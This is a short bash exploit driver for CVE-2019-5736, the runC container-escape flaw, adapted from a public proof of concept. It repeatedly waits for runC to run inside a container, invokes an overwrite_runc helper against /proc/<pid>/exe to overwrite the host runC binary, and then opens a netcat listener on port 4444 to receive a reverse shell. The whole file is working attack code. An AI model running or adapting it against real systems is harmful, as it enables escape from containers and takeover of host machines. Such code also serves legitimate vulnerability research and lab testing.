#!/bin/bash

# Credits: https://github.com/twistlock/RunC-CVE-2019-5736/tree/master/exec_POC
# Adapted by Jakob Weber (https://github.com/KunoVonHagen) to repeat the exploit until it succeeded
# and start netcat afterwards to recieve a shell connection 

while true; do
    echo "[+] Waiting for runC to be executed in the container..."

    runc_pid=$(ps axf | grep /proc/self/exe | grep -v grep | awk '{print $1}')

    # Wait for /proc/self/exe to be executed
    while [ -z "$runc_pid" ]; do
        runc_pid=$(ps axf | grep /proc/self/exe | grep -v grep | awk '{print $1}')
    done

    # Call overwrite_runc with the symlink to the runC binary
    ./overwrite_runc /proc/${runc_pid}/exe

    # Check if the last command (overwrite_runc) succeeded
    if [ $? -eq 0 ]; then
        # If overwrite_runc succeeds, break the loop
        break
    fi

    # If overwrite_runc fails, print a message and restart the loop
    echo "[!] overwrite_runc execution failed. Retrying..."
done

# Start the netcat listener
nc -lnvp 4444
